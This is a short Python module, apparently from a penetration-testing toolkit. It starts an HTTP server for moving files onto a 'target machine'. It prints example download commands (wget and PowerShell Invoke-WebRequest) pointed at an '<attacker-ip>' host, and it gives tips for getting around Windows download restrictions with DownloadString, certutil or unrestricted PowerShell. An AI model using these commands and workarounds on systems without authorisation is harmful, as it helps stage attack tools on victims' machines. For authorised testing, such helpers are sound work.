import http.server
import socketserver
import os
import sys

from rawrs.core.globaldata import bcolors


def start_http_server(port=8000, root_dir="."):
    """
    Start a simple Python HTTP server to transfer files to the target machine.
    Serves files from the specified root_dir on the given port.
    Gracefully shuts down and restores CWD when interrupted.
    """
    def shutdown_server(signum=None, frame=None):
        print("\n[!] Shutting down HTTP server...")
        httpd.shutdown()
        os.chdir(original_cwd)
        sys.exit(0)
    original_cwd = os.getcwd()
    os.chdir(root_dir[0])

    handler = http.server.SimpleHTTPRequestHandler
    httpd = socketserver.TCPServer(("", int(port[0])), handler)



    # Catch Ctrl+C or kill signals


    try:
        print(f"{bcolors.OKCYAN}[+] Serving {os.path.abspath(root_dir[0])} via HTTP on port {port[0]} (http://0.0.0.0:{port[0]}/)\n")
        print(f"{bcolors.OKCYAN}Ctrl+c to stop the web server\n")
        print(f"{bcolors.YELLOW}Here is how to fetch from the  webserver:")
        print("[i] Example (Linux): wget http://<attacker-ip>:8000/file")
        print("[i] Example (Windows PS): Invoke-WebRequest -Uri http://<attacker-ip>:8000/file -OutFile file\n\n")
        httpd.serve_forever()
    except KeyboardInterrupt:
        shutdown_server()

def transftips():
    print(f"\n{bcolors.YELLOW}[i] A specific machine might have certain programs unavailable or firewalled. Its important to check a few methods if a specific one fails.\n\n ")
    print(f"\n[i] Most of the times, OS won't let ports under a threshold be used without superuser rights. These are the ports 0 to 1024. Use any other port{bcolors.RESET}\n\n")
    print(f"\n[i] In windows, easy to use fetch methods like Invoke-WebRequest might be unusable due to restrictions. There are various ways to work around this like equivalent commands like DownloadString or certutil, or by using a PowerShell executable without restrictions, among others{bcolors.RESET}\n\n")
